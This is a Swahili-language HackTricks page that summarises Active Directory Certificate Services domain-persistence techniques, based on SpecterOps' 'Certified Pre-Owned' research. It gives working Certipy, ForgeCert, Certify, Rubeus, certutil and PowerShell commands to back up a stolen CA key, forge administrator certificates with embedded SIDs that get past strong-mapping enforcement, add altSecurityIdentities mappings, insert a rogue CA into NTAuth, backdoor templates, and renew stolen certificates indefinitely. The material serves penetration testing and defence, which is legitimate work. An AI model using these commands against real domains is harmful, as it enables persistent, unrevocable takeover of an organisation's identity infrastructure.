# Uendelevu wa Kikoa cha AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Huu ni muhtasari wa mbinu za uendelevu wa kikoa zilizoelezewa katika [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Iangalie kwa maelezo zaidi.<sup>[[5]](#references)</sup>

## Kutengeneza Vyeti kwa Kutumia Vyeti vya CA Vilivyoibwa (Golden Certificate) - DPERSIST1

Unawezaje kujua kwamba cheti ni cheti cha CA?

Inaweza kubainika kuwa cheti ni cheti cha CA ikiwa masharti kadhaa yametimizwa:<sup>[[5]](#references)</sup>

- Cheti kimehifadhiwa kwenye seva ya CA, huku ufunguo wake binafsi ukilindwa na DPAPI ya mashine, au na maunzi kama vile TPM/HSM ikiwa mfumo wa uendeshaji unayaunga mkono.
- Sehemu za Issuer na Subject za cheti zinafanana na jina bainifu la CA.
- Kiendelezi cha "CA Version" kinapatikana katika vyeti vya CA pekee.
- Cheti hakina sehemu za Extended Key Usage (EKU).

Ili kutoa ufunguo binafsi wa cheti hiki, kutumia zana ya `certsrv.msc` kwenye seva ya CA ndiyo njia inayoungwa mkono kupitia GUI iliyojengewa ndani. Hata hivyo, cheti hiki hakitofautiani na vingine vilivyohifadhiwa kwenye mfumo; kwa hivyo, mbinu kama vile [mbinu ya THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zinaweza kutumiwa kukitoa.

Cheti na ufunguo binafsi pia vinaweza kupatikana kwa kutumia Certipy kwa amri ifuatayo:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Baada ya kupata cheti cha CA na ufunguo wake binafsi katika umbizo la `.pfx`, zana kama [ForgeCert](https://github.com/GhostPack/ForgeCert) zinaweza kutumiwa kutengeneza vyeti halali:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Mtumiaji anayelengwa kwa ajili ya kughushi cheti lazima awe amewashwa na aweze kujithibitisha katika Active Directory ili mchakato ufanikiwe. Kugushi cheti kwa akaunti maalum kama krbtgt hakufai.

Cheti hiki kilichoghushiwa kitakuwa **halali** hadi tarehe ya mwisho iliyoainishwa na **kwa muda ambao cheti cha root CA ni halali** (kwa kawaida kuanzia miaka 5 hadi **10+**). Pia ni halali kwa **mashine**, kwa hivyo kikichanganywa na **S4U2Self**, mshambuliaji anaweza **kuendeleza persistence kwenye mashine yoyote ya domain** kwa muda wote ambao cheti cha CA ni halali.\
Zaidi ya hayo, **vyeti vilivyotengenezwa** kwa kutumia mbinu hii **haviwezi kubatilishwa**, kwa kuwa CA haivifahamu.

### Kufanya kazi chini ya Strong Certificate Mapping Enforcement (2025+)

Tangu Februari 11, 2025 (baada ya usambazaji wa KB5014754), domain controller hutumia **Full Enforcement** kama chaguo-msingi kwa certificate mappings. Kwa vitendo, hii inamaanisha vyeti vyako vilivyoghushiwa lazima ama:

- Viwe na binding imara kwa akaunti inayolengwa (kwa mfano, SID security extension), au
- Vilandanishwe na mapping imara na ya moja kwa moja kwenye attribute ya `altSecurityIdentities` ya object inayolengwa.<sup>[[1]](#references)</sup>

Njia ya kuaminika ya persistence ni kutengeneza cheti ghushi kilichounganishwa na Enterprise CA iliyoibiwa, kisha kuongeza mapping imara na ya moja kwa moja kwa principal aliyeathiriwa:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Maelezo
- Ukiweza kutengeneza certificates ghushi zinazojumuisha SID security extension, zitaunganishwa moja kwa moja hata chini ya Full Enforcement. Vinginevyo, pendelea explicit strong mappings. Tazama [account-persistence](account-persistence.md) kwa maelezo zaidi kuhusu explicit mappings.
- Revocation haiwasaidii watetezi hapa: certificates ghushi hazijulikani kwenye hifadhidata ya CA, kwa hivyo haziwezi kufutwa.

#### Kutengeneza certificates ghushi zinazooana na Full Enforcement (SID-aware)

Zana zilizosasishwa hukuwezesha kupachika SID moja kwa moja, na hivyo kufanya golden certificates ziendelee kutumika hata DCs zinapokataa mappings dhaifu:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Kwa kupachika SID, unaepuka kugusa `altSecurityIdentities`, ambayo huenda inafuatiliwa, huku bado ukitimiza ukaguzi mkali wa mapping.

## Kuamini Vyeti vya CA Bandia - DPERSIST2

Object ya `NTAuthCertificates` imekusudiwa kuwa na cheti kimoja au zaidi cha **CA** ndani ya attribute yake ya `cacertificate`, ambayo Active Directory (AD) hutumia. Mchakato wa uthibitishaji unaofanywa na **domain controller** hukagua object ya `NTAuthCertificates` ili kupata ingizo linalolingana na **CA iliyobainishwa** kwenye sehemu ya Issuer ya **certificate** inayotumika kuthibitisha utambulisho. Uthibitishaji huendelea ikiwa ulinganifu utapatikana.<sup>[[5]](#references)</sup>

Mshambuliaji anaweza kuongeza certificate ya CA iliyosainiwa yenyewe kwenye object ya `NTAuthCertificates`, ikiwa ana udhibiti wa object hii ya AD. Kwa kawaida, ni wanachama wa kikundi cha **Enterprise Admin**, pamoja na **Domain Admins** au **Administrators** katika **domain ya forest root**, wanaopewa ruhusa ya kurekebisha object hii. Wanaweza kuhariri object ya `NTAuthCertificates` kwa kutumia `certutil.exe` na amri `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, au kwa kutumia [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Amri nyingine muhimu kwa mbinu hii:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Uwezo huu ni muhimu hasa unapotumiwa pamoja na njia iliyoelezwa awali inayotumia ForgeCert kuzalisha certificates kwa nguvu.

> Mazingatio ya mapping baada ya 2025: kuweka CA hasidi katika NTAuth huanzisha tu uaminifu kwa CA inayotoa certificate. Ili kutumia leaf certificates kuingia wakati DC ziko katika **Full Enforcement**, leaf lazima iwe na SID security extension au kuwe na mapping imara iliyo wazi kwenye object lengwa (kwa mfano, Issuer+Serial katika `altSecurityIdentities`). Angalia {{#ref}}account-persistence.md{{#endref}}.

## Usanidi Mbaya - DPERSIST3

Fursa za **persistence** kupitia **marekebisho ya security descriptor za** vipengele vya AD CS ni nyingi. Mabadiliko yaliyoelezwa katika sehemu ya "[Domain Escalation](domain-escalation.md)" yanaweza kutekelezwa kwa nia hasidi na mshambuliaji mwenye ufikiaji wa juu. Hii inajumuisha kuongeza "haki za udhibiti" (kwa mfano, WriteOwner/WriteDACL/n.k.) kwenye vipengele nyeti kama vile:<sup>[[5]](#references)</sup>

- Object ya kompyuta ya AD ya **seva ya CA**
- **Seva ya RPC/DCOM ya seva ya CA**
- Object au container yoyote ya **AD iliyo chini yake** katika **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (kwa mfano, container ya Certificate Templates, container ya Certification Authorities, object ya NTAuthCertificates, n.k.)
- **Vikundi vya AD vilivyopewa waziwazi na shirika haki za kudhibiti CA au template**. Kikundi kilichojengewa ndani cha Cert Publishers kimeidhinishwa kuchapisha certificates kwenye objects za watumiaji katika AD; kuwa mwanachama pekee hakutoi haki za kudhibiti CA au template wala haki za kujiandikisha. Kagua ruhusa zinazohusika za CA na template kando. Angalia [maelezo ya Microsoft kuhusu Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) na [ruhusa za certificate template](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Mfano wa utekelezaji hasidi unaweza kuhusisha mshambuliaji mwenye **ruhusa za juu** katika domain, akiongeza ruhusa ya **`WriteOwner`** kwenye certificate template chaguomsingi ya **`User`**, huku mshambuliaji akiwa principal wa haki hiyo. Ili kuitumia vibaya, mshambuliaji angebadilisha kwanza umiliki wa template ya **`User`** uwe wake. Baada ya hapo, **`mspki-certificate-name-flag`** ingewekwa kuwa **1** kwenye template ili kuwezesha **`ENROLLEE_SUPPLIES_SUBJECT`**, na kumruhusu mtumiaji kutoa Subject Alternative Name katika ombi. Kisha, mshambuliaji angeweza **kujiandikisha** kwa kutumia **template**, akichagua jina la **msimamizi wa domain** kama jina mbadala, na kutumia certificate aliyopata kujithibitisha kama DA.

Mipangilio ambayo washambuliaji wanaweza kuweka kwa ajili ya persistence ya muda mrefu kwenye domain (tazama {{#ref}}domain-escalation.md{{#endref}} kwa maelezo kamili na jinsi ya kugundua):

- Bendera za sera za CA zinazoruhusu SAN kutoka kwa waombaji (kwa mfano, kuwezesha `EDITF_ATTRIBUTESUBJECTALTNAME2`). Hii huacha njia zinazofanana na ESC1 zikiweza kutumiwa.
- DACL au mipangilio ya template inayoruhusu utoaji wa certificate zinazoweza kutumika kujithibitisha (kwa mfano, kuongeza Client Authentication EKU, kuwezesha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kudhibiti object ya `NTAuthCertificates` au containers za CA ili kurejesha mara kwa mara issuers hasidi iwapo watetezi watajaribu kuziondoa.

> [!TIP]
> Katika mazingira yaliyofanyiwa hardening baada ya KB5014754, kuoanisha usanidi huu mbaya na mappings imara zilizo wazi (`altSecurityIdentities`) huhakikisha kwamba certificates mlizotoa au kutengeneza kwa kughushi zinaendelea kutumika hata DC zinapotekeleza strong mapping.

### Matumizi mabaya ya kusasisha certificate (ESC14) kwa persistence

Ukiathiri certificate inayoweza kutumika kujithibitisha (au ya Enrollment Agent), unaweza **kuisasisha bila kikomo** mradi template iliyotoa certificate hiyo iendelee kuchapishwa na CA yako iendelee kuamini mnyororo wa issuer. Kusasisha huhifadhi vifungamanishi vya utambulisho vya awali lakini huongeza muda wa uhalali, hivyo kufanya iwe vigumu kuiondoa isipokuwa template irekebishwe au CA ichapishwe upya.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Ikiwa domain controllers ziko katika **Full Enforcement**, ongeza `-sid <victim SID>` (au tumia template ambayo bado inajumuisha SID security extension) ili leaf certificate inayofanywa upya iendelee kumapishwa kwa nguvu bila kugusa `altSecurityIdentities`. Washambuliaji wenye CA admin rights wanaweza pia kurekebisha `policy\RenewalValidityPeriodUnits` ili kuongeza muda wa uhalali wa vyeti vinavyofanywa upya kabla ya kujitolea cheti.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Mabadiliko ya uthibitishaji unaotegemea vyeti kwenye domain controllers za Windows (ratiba ya enforcement na strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Marejeleo ya amri na matumizi ya forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (forge iliyounganishwa yenye usaidizi wa SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Muhtasari wa matumizi mabaya ya ESC14 wakati wa kufanya upya](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Matumizi mabaya ya Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
